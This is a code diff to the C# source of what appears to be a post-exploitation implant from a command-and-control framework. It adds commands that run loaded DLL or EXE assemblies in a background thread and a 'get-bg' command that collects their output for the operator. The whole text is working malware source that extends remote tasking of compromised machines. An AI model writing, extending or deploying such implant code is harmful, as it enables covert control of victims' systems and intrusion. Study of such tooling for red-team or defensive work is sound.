@@ -22,6 +22,7 @@ public class Program
 	public static string secret;
 	public static string output;
 	public static bool running;
+    private static StringWriter backgroundTaskOutput = new StringWriter();
 
 	public static void Sharp()
 	{
@@ -113,6 +114,13 @@ public class Program
                                         catch (Exception e) { Console.WriteLine($"Error loading modules {e}"); }
                                         sOutput2.WriteLine("Module loaded sucessfully");
                                     }
+                                    else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
+                                    {
+                                        Thread t = new Thread(() => RunAssembly(cmd, true));
+                                        t.Start();
+                                        sOutput2.WriteLine("[+] Running task in background, run get-bg to get background output.");
+                                        sOutput2.WriteLine("[*] Only run one task in the background at a time per implant.");
+                                    }
                                     else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
                                     {
                                         var oldOutput = Console.Out;
@@ -123,6 +131,18 @@ public class Program
                                     else if (cmd.ToLower() == "foo")
                                     {
                                         sOutput2.WriteLine("bar");
+                                    }
+                                    else if(cmd.ToLower() == "get-bg")
+                                    {
+                                        var backgroundTaskOutputString = backgroundTaskOutput.ToString();
+                                        if(!string.IsNullOrEmpty(backgroundTaskOutputString))
+                                        {
+                                            output.Append(backgroundTaskOutputString);
+                                        }
+                                        else
+                                        {
+                                            sOutput2.WriteLine("[-] No output");
+                                        }
                                     }
                                     else
                                     {
@@ -141,6 +161,8 @@ public class Program
 
                                     output.Clear();
                                     output.Length = 0;
+
+
                                     sOutput2.Flush();
                                     sOutput2.Close();
                                 }
@@ -194,8 +216,15 @@ public class Program
         }, null, true);
     }
 
-    private static string RunAssembly(string c)
+    private static string RunAssembly(string c, bool background = false)
     {
+
+        var oldOutput = Console.Out;
+        if(background)
+        {
+            backgroundTaskOutput = new StringWriter();
+            Console.SetOut(backgroundTaskOutput);
+        }
         var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
         int i = 0;
         var sOut = "";
@@ -267,6 +296,11 @@ public class Program
                 }
                 break;
             }
+        }
+        if(background)
+        {
+            Console.SetOut(oldOutput);
+            backgroundTaskOutput.WriteLine(sOut);
         }
         return sOut;
     }
